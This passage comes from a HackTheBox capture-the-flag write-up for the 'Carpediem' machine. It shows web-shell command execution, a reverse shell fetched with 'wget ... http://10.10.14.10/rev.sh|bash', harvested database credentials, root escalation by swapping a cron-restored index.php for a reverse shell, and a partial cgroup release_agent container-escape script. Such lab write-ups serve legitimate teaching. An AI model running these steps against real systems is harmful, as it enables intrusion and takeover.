font-style: inherit;">groups</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>33<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">www-data</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb34-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  carpediem curl <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-k</span> https://localhost:8002/modules/reference/shell.php\?cmd\=hostname</span>
<span id="cb34-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">90c7f522b842</span></span>
<span id="cb34-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  carpediem curl <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-k</span> https://localhost:8002/modules/reference/shell.php\?cmd\=ls%20-al</span>
<span id="cb34-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">total</span> 76</span>
<span id="cb34-7"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">drwxr-xr-x</span> 4 www-data www-data  4096 Sep 14 00:55 .</span>
<span id="cb34-8"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">drwxr-xr-x</span> 3 www-data www-data  4096 Sep 14 00:55 ..</span>
<span id="cb34-9"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-rw-r--r--</span> 1 www-data www-data 18092 Sep 14 00:55 LICENSE.txt</span>
<span id="cb34-10"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-rw-r--r--</span> 1 www-data www-data  1768 Sep 14 00:55 README.md</span>
<span id="cb34-11"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-rw-r--r--</span> 1 www-data www-data   323 Sep 14 00:55 reference.info</span>
<span id="cb34-12"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-rw-r--r--</span> 1 www-data www-data   484 Sep 14 00:55 reference.install</span>
<span id="cb34-13"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-rw-r--r--</span> 1 www-data www-data 23598 Sep 14 00:55 reference.module</span>
<span id="cb34-14"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-rw-r--r--</span> 1 www-data www-data    30 Sep 14 00:55 shell.php</span>
<span id="cb34-15"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">drwxr-xr-x</span> 2 www-data www-data  4096 Sep 14 00:55 tests</span>
<span id="cb34-16"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">drwxr-xr-x</span> 2 www-data www-data  4096 Sep 14 00:55 views</span></code></pre></div>
<p>Using cURL to trigger a reverse shell (like before) doesn’t seem to work in this container, instead we use <strong>wget</strong>:</p>
<div class="sourceCode" id="cb35" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb35-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  carpediem curl <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-k</span> https://localhost:8002/modules/reference/shell.php\?cmd\=wget%20-qO-%20http://10.10.14.10/rev.sh\|bash</span>
<span id="cb35-2"></span>
<span id="cb35-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  carpediem python3 <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-m</span> http.server 80</span>
<span id="cb35-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Serving</span> HTTP on 0.0.0.0 port 80 <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">http://0.0.0.0:80/</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">...</span></span>
<span id="cb35-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">10.10.11.167</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span> [14/Sep/2022 09:03:27] <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"GET /rev.sh HTTP/1.1"</span> 200 </span>
<span id="cb35-6"></span>
<span id="cb35-7"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  carpediem nc <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-lvnp</span> 4488</span>
<span id="cb35-8"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">listening</span> on <span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">[</span><span class="ss" style="color: #20794D;
background-color: null;
font-style: inherit;">any</span><span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">]</span> 4488 ...</span>
<span id="cb35-9"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">connect</span> to <span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">[</span><span class="ss" style="color: #20794D;
background-color: null;
font-style: inherit;">10.10.14.10</span><span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">]</span> from <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">UNKNOWN</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[10.10.11.167]</span> 58916</span>
<span id="cb35-10"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">bash:</span> cannot set terminal process group <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">271</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">:</span> Inappropriate ioctl for device</span>
<span id="cb35-11"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">bash:</span> no job control in this shell</span>
<span id="cb35-12"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">www-data@90c7f522b842:/var/www/html/backdrop/modules/reference$</span> </span></code></pre></div>
</section>
<section id="step-3---escalate-to-root" class="level3">
<h3 class="anchored" data-anchor-id="step-3---escalate-to-root">Step 3 - Escalate to root</h3>
<p>Before uploading <code>deepce.sh</code> lets have a look around if we find anything sensitive.</p>
<p>New MySQL credentials:</p>
<div class="sourceCode" id="cb36" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb36-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">www-data@90c7f522b842:/var/www/html/backdrop$</span> cat settings.php</span>
<span id="cb36-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[...</span> snip ...]</span>
<span id="cb36-3"><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$database</span> = <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'mysql://backdrop:34tB8RGtgtJjZ2Tz@localhost/backdrop'</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span></span></code></pre></div>
<p>A script owned by root that we have execute privileges over:</p>
<div class="sourceCode" id="cb37" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb37-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">www-data@90c7f522b842:/opt$</span> ls <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-al</span></span>
<span id="cb37-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">total</span> 12</span>
<span id="cb37-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">drwxr-xr-x</span> 1 root root 4096 Jun 23 09:50 .</span>
<span id="cb37-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">drwxr-xr-x</span> 1 root root 4096 Sep 14 01:10 ..</span>
<span id="cb37-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-rwxr-xr-x</span> 1 root root  510 Jun 23 09:49 heartbeat.sh</span>
<span id="cb37-6"></span>
<span id="cb37-7"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">www-data@90c7f522b842:/opt$</span> cat heartbeat.sh</span>
<span id="cb37-8"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">#!/bin/bash</span></span>
<span id="cb37-9"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">#Run a site availability check every 10 seconds via cron</span></span>
<span id="cb37-10"><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">checksum</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">($(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">/usr/bin/md5sum</span> /var/www/html/backdrop/core/scripts/backdrop.sh<span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">))</span></span>
<span id="cb37-11"><span class="cf" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">if</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">[[</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$checksum</span> <span class="ot" style="color: #003B4F;
background-color: null;
font-style: inherit;">!=</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"70a121c0202a33567101e2330c069b34"</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">]];</span> <span class="cf" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">then</span></span>
<span id="cb37-12">    <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">exit</span></span>
<span id="cb37-13"><span class="cf" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">fi</span></span>
<span id="cb37-14"><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">status</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">php</span> /var/www/html/backdrop/core/scripts/backdrop.sh <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--root</span> /var/www/html/backdrop https://localhost<span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">)</span></span>
<span id="cb37-15"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">grep</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Welcome to backdrop.carpediem.htb!"</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$status</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"</span></span>
<span id="cb37-16"><span class="cf" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">if</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">[[</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$?</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"</span> <span class="ot" style="color: #003B4F;
background-color: null;
font-style: inherit;">!=</span> 0 <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">]];</span> <span class="cf" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">then</span></span>
<span id="cb37-17">    <span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">#something went wrong.  restoring from backup.</span></span>
<span id="cb37-18">    <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">cp</span> /root/index.php /var/www/html/backdrop/index.php</span>
<span id="cb37-19"><span class="cf" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">fi</span></span></code></pre></div>
<p>The comments in the scripts do a good job explaining what it does, every few seconds it will run the script to make sure that <code>backdrop.carpediem.htb</code> is alive and running. If something is wrong, it will copy a backup of <code>index.php</code> from <code>/root</code>, to restore the site.</p>
<p>We can confirm if this script is executed by <code>root</code> or <code>www-data</code> using <code>pspy64</code>:</p>
<div class="sourceCode" id="cb38" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb38-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">www-data@90c7f522b842:/dev/shm$</span> wget http://10.10.14.10/pspy64</span>
<span id="cb38-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">www-data@90c7f522b842:/dev/shm$</span> chmod +x pspy64</span>
<span id="cb38-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">www-data@90c7f522b842:/dev/shm$</span> cp pspy64 /tmp</span>
<span id="cb38-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">www-data@90c7f522b842:/dev/shm$</span> /tmp/pspy64</span>
<span id="cb38-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[...</span> snip ...]</span>
<span id="cb38-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">2022/09/14</span> 01:25:17 CMD: UID=0    PID=54872  <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">/bin/bash</span> /opt/heartbeat.sh</span></code></pre></div>
<p>It’s ran as root. We should be able to get a revere shell as root then by simply replacing index.php with a reverse shell..</p>
<div class="sourceCode" id="cb39" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb39-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">www-data@90c7f522b842:/dev/shm$</span> cp rev.php /var/www/html/backdrop/index.php</span>
<span id="cb39-2"></span>
<span id="cb39-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  carpediem nc <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-lvnp</span> 4499                              </span>
<span id="cb39-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">listening</span> on <span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">[</span><span class="ss" style="color: #20794D;
background-color: null;
font-style: inherit;">any</span><span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">]</span> 4499 ...</span>
<span id="cb39-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">connect</span> to <span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">[</span><span class="ss" style="color: #20794D;
background-color: null;
font-style: inherit;">10.10.14.10</span><span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">]</span> from <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">UNKNOWN</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[10.10.11.167]</span> 41614</span>
<span id="cb39-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Linux</span> 90c7f522b842 5.4.0-97-generic <span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">#110-Ubuntu SMP Thu Jan 13 18:22:13 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux</span></span>
<span id="cb39-7"> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">01:30:16</span> up 1 day, 23:13,  0 users,  load average: 0.03, 0.09, 0.08</span>
<span id="cb39-8"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">USER</span>     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT</span>
<span id="cb39-9"><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">uid</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>0<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">root</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">gid</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>0<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">root</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">groups</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>0<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">root</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb39-10"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">/bin/sh:</span> 0: cant access tty<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">job</span> control turned off</span>
<span id="cb39-11"></span>
<span id="cb39-12"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;"># id &amp;&amp; hostname</span></span>
<span id="cb39-13"><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">uid</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>0<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">root</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">gid</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>0<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">root</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">groups</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>0<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">root</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb39-14"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">90c7f522b842</span></span></code></pre></div>
</section>
<section id="step-4---container-escape" class="level3">
<h3 class="anchored" data-anchor-id="step-4---container-escape">Step 4 - Container escape</h3>
<p>Trying to escape this container we can upload <code>deepce.sh</code> to get some quick information:</p>
<div class="sourceCode" id="cb40" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb40-1"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;"># wget http://10.10.14.10/deepce.sh</span></span>
<span id="cb40-2"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;"># chmod +x deepce.sh</span></span>
<span id="cb40-3"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;"># bash deepce.sh</span></span>
<span id="cb40-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[...</span> snip ...]</span>
<span id="cb40-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[+]</span> Dangerous Capabilities .. Yes</span>
<span id="cb40-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Current:</span> cap_dac_override</span>
<span id="cb40-7"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Bounding</span> set =cap_dac_override</span>
<span id="cb40-8"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Current</span> IAB: !cap_dac_read_search,!cap_sys_module,!cap_sys_ptrace,!cap_sys_admin</span>
<span id="cb40-9"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[+]</span> Privileged Mode ......... Unknown</span>
<span id="cb40-10"></span>
<span id="cb40-11"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[+]</span> Docker sock mounted ....... No</span>
<span id="cb40-12"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[+]</span> Other mounts .............. No</span></code></pre></div>
<p>To verify if we’re in a privileged mode or not, we can simply <code>ls -al /dev</code>, if privileged all devices should be accessible and we can escape by mounting the host disk. If not privileged only a limited amount of devices are shown.</p>
<div class="sourceCode" id="cb41" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb41-1"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;"># ls -al /dev   </span></span>
<span id="cb41-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">total</span> 4</span>
<span id="cb41-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">drwxr-xr-x</span> 5 root root    360 Sep 12 02:16 .</span>
<span id="cb41-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">drwxr-xr-x</span> 1 root root   4096 Sep 14 02:15 ..</span>
<span id="cb41-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">crw--w----</span> 1 root tty  136, 0 Sep 12 02:16 console</span>
<span id="cb41-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">lrwxrwxrwx</span> 1 root root     11 Sep 12 02:16 core <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> /proc/kcore</span>
<span id="cb41-7"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">lrwxrwxrwx</span> 1 root root     13 Sep 12 02:16 fd <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> /proc/self/fd</span>
<span id="cb41-8"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">crw-rw-rw-</span> 1 root root   1, 7 Sep 12 02:16 full</span>
<span id="cb41-9"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">drwxrwxrwt</span> 2 root root     40 Sep 12 02:16 mqueue</span>
<span id="cb41-10"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">crw-rw-rw-</span> 1 root root   1, 3 Sep 12 02:16 null</span>
<span id="cb41-11"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">lrwxrwxrwx</span> 1 root root      8 Sep 12 02:16 ptmx <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> pts/ptmx</span>
<span id="cb41-12"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">drwxr-xr-x</span> 2 root root      0 Sep 12 02:16 pts</span>
<span id="cb41-13"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">crw-rw-rw-</span> 1 root root   1, 8 Sep 12 02:16 random</span>
<span id="cb41-14"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">drwxrwxrwt</span> 3 root root    120 Sep 14 01:46 shm</span>
<span id="cb41-15"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">lrwxrwxrwx</span> 1 root root     15 Sep 12 02:16 stderr <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> /proc/self/fd/2</span>
<span id="cb41-16"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">lrwxrwxrwx</span> 1 root root     15 Sep 12 02:16 stdin <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> /proc/self/fd/0</span>
<span id="cb41-17"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">lrwxrwxrwx</span> 1 root root     15 Sep 12 02:16 stdout <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> /proc/self/fd/1</span>
<span id="cb41-18"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">crw-rw-rw-</span> 1 root root   5, 0 Sep 12 02:16 tty</span>
<span id="cb41-19"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">crw-rw-rw-</span> 1 root root   1, 9 Sep 12 02:16 urandom</span>
<span id="cb41-20"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">crw-rw-rw-</span> 1 root root   1, 5 Sep 12 02:16 zero</span></code></pre></div>
<p>We’re missing a lot of devices, so we’re not privileged.</p>
<p>Looking on the capabilities, we only have <code>dac_override</code> that stands out, this allows us to write to any file, something that is expected when <code>root</code> so we can skip this.</p>
<p>Googling around for further escapes I come across <a href="https://i.blackhat.com/USA-19/Thursday/us-19-Edwards-Compendium-Of-Container-Escapes-up.pdf">this PDF</a> from blackhat where <code>release_agent</code> escape is mentioned on page 57. I’ve never heard of this before, and looking on the commands we can see we’ll not be able to run it as we’re not allowed to use <code>mount</code>:</p>
<p><img src="https://exploit.se/posts/2022-09-14-htb-writeup-carpediem/images/carpediem22.png" class="img-fluid"></p>
<div class="sourceCode" id="cb42" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb42-1"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;"># mount -t cgroup -o rdma cgroup /tmp/esc</span></span>
<span id="cb42-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">mount:</span> /tmp/esc: permission denied.</span></code></pre></div>
<p>Running <code>linpeas.sh</code> confirms that this should be a breakout vector, so maybe I need to dig a bit deeper.</p>
<div class="sourceCode" id="cb43" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb43-1"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;"># wget http://10.10.14.10/linpeas.sh</span></span>
<span id="cb43-2"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;"># chmod +x linpeas.sh</span></span>
<span id="cb43-3"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;"># bash linpeas.sh </span></span>
<span id="cb43-4"></span>
<span id="cb43-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">══╣</span> Breakout via mounts</span>
<span id="cb43-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">╚</span> https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation/sensitive-mounts</span>
<span id="cb43-7"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">═╣</span> release_agent breakout 1........ Yes</span></code></pre></div>
<p>Steal the script from HackTricks, upload it and run doesn’t work either..</p>
<div class="sourceCode" id="cb44" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb44-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  carpediem cat esc.sh </span>
<span id="cb44-2"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;"># Finds + enables a cgroup release_agent</span></span>
<span id="cb44-3"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;"># Looks for something like: /sys/fs/cgroup/*/release_agent</span></span>
<span id="cb44-4"><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">d</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">`</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">dirname</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$(</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">ls</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-x</span> /s<span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">*</span>/fs/c<span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">*</span>/<span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">*</span>/r<span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">*</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">head</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-n1</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">)</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">`</span></span>
<span id="cb44-5"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;"># If "d" is empty, this won't work, you need to use the next PoC</span></span>
<span id="cb44-6"></span>
<span id="cb44-7"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;"># Enables notify_on_release in the cgroup</span></span>
<span id="cb44-8"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">mkdir</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-p</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$d</span>/w<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span></span>
<span id="cb44-9"><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">echo</span> 1 <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$d</span>/w/notify_on_release</span>
<span id="cb44-10"><span class="co" style="color: #5E5E5E;
